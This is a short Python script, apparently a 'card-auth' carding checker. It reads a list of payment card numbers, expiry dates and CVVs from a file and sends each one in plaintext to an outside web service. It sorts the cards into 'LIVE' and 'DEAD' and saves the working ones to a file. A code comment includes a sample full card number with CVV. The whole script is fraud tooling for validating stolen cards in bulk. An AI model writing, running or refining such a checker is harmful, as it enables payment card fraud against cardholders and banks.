import os
import requests

def header():
    print('''

 ██████╗ █████╗ ██████╗ ██████╗        █████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝██╔══██╗██╔══██╗██╔══██╗      ██╔══██╗██║   ██║╚══██╔══╝██║  ██║
██║     ███████║██████╔╝██║  ██║█████╗███████║██║   ██║   ██║   ███████║
██║     ██╔══██║██╔══██╗██║  ██║╚════╝██╔══██║██║   ██║   ██║   ██╔══██║
╚██████╗██║  ██║██║  ██║██████╔╝      ██║  ██║╚██████╔╝   ██║   ██║  ██║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝

        By : Seiba - https://seiba.me                                    
''')

def content_file():
    # get current path
    path = os.getcwd()
    file_path = path + '/data/raw/card.txt'
    file = open(file_path, 'r')
    content = file.read()
    content = content.split('\n')
    file.close()

    return content


def card_auth(ccn, month, year, cvv):

    # get request result from api https://seiba.me/card?ccn=4023470603031261&month=01&year=2025&cvv=284
    url = 'https://seiba.me/card?ccn=' + ccn + '&month=' + month + '&year=' + year + '&cvv=' + cvv
    r = requests.get(url)

    # get result
    result = r.json()
    if result['status'] == 200:
        
        if result['message']['status'] != 'declined':
            # save to file data/result/live.txt
            file_path = os.getcwd() + '/data/result/live.txt'
            file = open(file_path, 'a')
            file.write(ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg'] + '\n')
            file.close()

            return '[LIVE] ' + ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg']

        else:
            return '[DEAD] ' + ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg']
    
    else:

        return result['message']

if __name__ == '__main__':

    header()
    
    content = content_file()
    for line in content:
        if line != '':
            line = line.split('|')
            ccn = line[0]
            month = line[1]
            year = line[2]
            cvv = line[3]

            print(card_auth(ccn, month, year, cvv))